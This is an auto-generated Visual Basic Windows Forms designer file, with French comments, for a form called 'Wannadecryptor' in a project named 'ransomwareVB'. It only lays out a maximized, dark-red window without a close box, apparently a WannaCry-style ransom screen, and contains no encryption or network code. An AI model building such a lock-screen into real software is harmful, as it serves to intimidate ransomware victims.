<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Wannadecryptor
    Inherits System.Windows.Forms.Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.uc_wannacry = New ransomwareVB.UserControl1()
        Me.SuspendLayout()
        '
        'uc_wannacry
        '
        Me.uc_wannacry.Anchor = System.Windows.Forms.AnchorStyles.None
        Me.uc_wannacry.AutoSize = True
        Me.uc_wannacry.BackColor = System.Drawing.Color.DarkRed
        Me.uc_wannacry.Location = New System.Drawing.Point(0, 0)
        Me.uc_wannacry.Name = "uc_wannacry"
        Me.uc_wannacry.Size = New System.Drawing.Size(779, 593)
        Me.uc_wannacry.TabIndex = 0
        '
        'Wannadecryptor
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(8.0!, 16.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.AutoSize = True
        Me.AutoValidate = System.Windows.Forms.AutoValidate.Disable
        Me.BackColor = System.Drawing.Color.Maroon
        Me.ClientSize = New System.Drawing.Size(779, 586)
        Me.ControlBox = False
        Me.Controls.Add(Me.uc_wannacry)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
        Me.Name = "Wannadecryptor"
        Me.Text = "Wannadecryptor"
        Me.WindowState = System.Windows.Forms.FormWindowState.Maximized
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents uc_wannacry As UserControl1
End Class
